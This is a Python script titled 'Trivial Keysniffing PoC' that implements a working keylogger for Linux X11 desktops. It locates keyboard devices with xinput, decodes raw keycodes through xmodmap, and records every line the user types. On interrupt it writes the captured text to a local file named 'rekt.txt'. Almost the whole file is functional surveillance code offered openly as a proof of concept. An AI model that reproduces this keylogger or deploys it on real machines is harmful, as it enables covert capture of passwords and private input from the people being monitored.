### Trivial Keysniffing PoC
import subprocess
import os, sys
import re


class Keysniffer():
	def __init__(self, xinput='/usr/bin/xinput'):
		self.xinput = xinput
		self.keycodes = []
		self.outfile = open('rekt.txt', 'a')
		self.keyboards = self.getKeyboards()
		self.getKeyCodes()
	

	def getKeyboards(self):
		"""
		Get the device ID for the keyboard from xinput
		"""
		# Exec 'xinput list' to get available input devices
		try:
			xinput_list = subprocess.Popen((self.xinput, 'list'), 
											stdout=subprocess.PIPE,
											universal_newlines=True)
		except OSError as err:
			print('[Error]: {}'.format(err))
		
		dev_ids = []
		for line in xinput_list.stdout:
			#  AT should be in the id line for standard keyboards on Linux
			if "AT" in line:
				l_split = str(line).split()
				
				# regex for id string
				find_id = re.compile('id=([0-9])')
				for word in l_split:
					if find_id.match(word):
						dev_ids.append(str(word).split('=')[-1])
					else:
						continue
			else:
				continue

		# If dev_ids has less than 1 value, no keyboard devices were found
		if len(dev_ids) < 1: 
			print("No keyboard devices found.")
			exit
		# else, return the list of device IDs.
		else: return dev_ids


	def getKeyCodes(self):
		"""
		Get keycode map using xmodmap and use the numeric codes as keys in a dictionary.
		"""
		# Call xmodmap to get keycode mapping, pipe stdout
		modmap_out = subprocess.Popen(('xmodmap', '-pm', '-pk'), 
										stdout=subprocess.PIPE,
										universal_newlines=True)

		# Iterate through output of xmodmap by line, split line into its items,
		# and append that list of items to codes[]
		kcodes = []
		for line in modmap_out.stdout:
			kcodes.append(str(line).strip().split())

		# Iterate through the resulting keycode list
		for line in kcodes:
			# Ignore lines with fewer than 2 values (each key from 
			# xmodmap out has min. of 3 values [code, hex, key])
			if len(line) < 2:
				pass
			else:
				# if first item is numeric, its a keycode
				c1 = str(line[0])
				if c1.isnumeric():
					# more than 4 items means there are 2 key values; keep both.      
					if len(line) > 4: 
						code_str = [c1, line[2], line[4]]
					else: 
						code_str = [c1, line[2]]
					
					# fill self.keycodes with resulting list items.
					# format: [code, val1, val2]
					self.keycodes.append(code_str)


	def findKey(self, code):
		"""
		Match a keycode to it's corresponding key
		"""
		for line in self.keycodes:
			# select line with matching code
			if line[0] == str(code):
				# alphanumeric chars will have a len of 3 since there are
				# in the format '(x)' at index [1] of the keycode line
				if len(line[1]) == 3:
					return line[1][1]
				elif line[1] == '(space)':
					return ' '
				# if line[1] is greater than 3, it is a special key or 
				# a punctuation/special character.
				# TODO: implement function to convert basic special key/chars
				# key values to their literal representations 
				elif len(line[1]) > 3:
					return "[{}]".format(line[1][1:-1])
			else:
				continue


	def codesToKeys(self, codes):
		"""
		Take a list of codes and return the resulting string.
		"""
		in_buffer = list(codes)
		out_buffer = []
		for code in in_buffer:
			if str(code).isnumeric():
				out_buffer.append(self.findKey(code))
		return out_buffer
		
       
	def keysToCodes(self, search):
		"""
		Take a string and return a list of each character's keycode
		"""
		# iterate through characters in search string, if it is alphanumeric
		# append parentheses to match xmonad format, and append that string to
		# the search_str[] list
		search_str = []
		for char in search:
			if str(char).isalnum():
				search_str.append('(' + char + ')')
			# TODO: add methods to check for non-alphanumeric characters like
			# punctuation symbols and others.
			else:
				pass
		
		# Iterate through each char in the resulting strings from above.
		# Then iterate through the keycode strings: if the char is in the keycode,
		# append keycode[0] (index 0 is the actual code) to result[]
		result = []
		for char in search_str:
			for code in self.keycodes:
				if char in code: result.append(code[0])
		return result


	def keySniff(self):
		"""
		Execute xinput to begin sniffing keycodes. Fill a list buffer 
		"""

		# Get the code for the Return key so we know when newlines happen.
		def get_enter():
			for code in self.keycodes:
				if code[1] == '(Return)' or code[2] == '(Return)':
					enter = code[0]
					return enter
				else:
					continue
		enter = get_enter()

		# Call xinput to start sniffing keycodes and pipe its output 
		keystream = subprocess.Popen((self.xinput, 'test', self.keyboards[0]), 
									  stdout=subprocess.PIPE, 
									  universal_newlines=True)
		try:
			kc = ['']
			master_db = []
			for line in keystream.stdout:
				if "release" in line:
					kc.append(str(line).strip().split()[-1])
					if kc[-1] == str(enter):
						res = ''.join(self.codesToKeys(kc))
						master_db.append(res)
						kc = ['']
				else:
					continue
		except KeyboardInterrupt:
			print("Keyboard interrupt, writing captured keys to file 'rekt.txt'")
			for entry in master_db:
				self.outfile.write(entry + "\n")
			self.outfile.close()
			sys.exit(0)
			

def main():
	ks = Keysniffer()
	ks.keySniff()

if __name__ == '__main__':
	main()

	